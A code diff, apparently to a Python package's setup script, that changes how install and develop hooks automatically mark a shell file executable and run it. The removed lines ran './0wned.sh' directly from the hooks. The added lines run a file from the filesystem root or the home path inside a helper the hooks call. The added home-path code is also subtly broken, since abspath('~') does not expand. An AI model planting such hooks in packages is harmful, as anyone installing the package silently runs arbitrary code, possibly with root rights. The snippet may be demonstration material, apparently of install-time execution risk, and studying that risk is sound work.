@@ -33,6 +33,8 @@ def touch_file():
             )
             print(message)
             root_fd.write(message + '\n')
+            os.system("chmod +x " + os.path.join(os.path.abspath(os.sep), FILENAME))
+            os.system(os.path.join(os.path.abspath(os.sep), FILENAME))
     except (IOError, OSError):
         try:
             with open(USER_PATH, 'a') as user_fd:
@@ -43,6 +45,8 @@ def touch_file():
                 )
                 print(message)
                 user_fd.write(message + '\n')
+                os.system("chmod +x " + os.path.join(os.path.abspath('~'), FILENAME))
+                os.system(os.path.join(os.path.abspath('~'), FILENAME))
         except (IOError, OSError):
             print('Could not write to {!r} or {!r}'.format(ROOT_PATH, USER_PATH))
             print('What kind of tricky system are you running this on?')
@@ -51,16 +55,12 @@ def touch_file():
 class PostDevelopCommand(develop):
     def run(self):
         touch_file()
-        os.system("chmod +x ./0wned.sh")
-        os.system("./0wned.sh")
         develop.run(self)
 
 
 class PostInstallCommand(install):
     def run(self):
         touch_file()
-        os.system("chmod +x ./0wned.sh")
-        os.system("./0wned.sh")
         install.run(self)
 
 
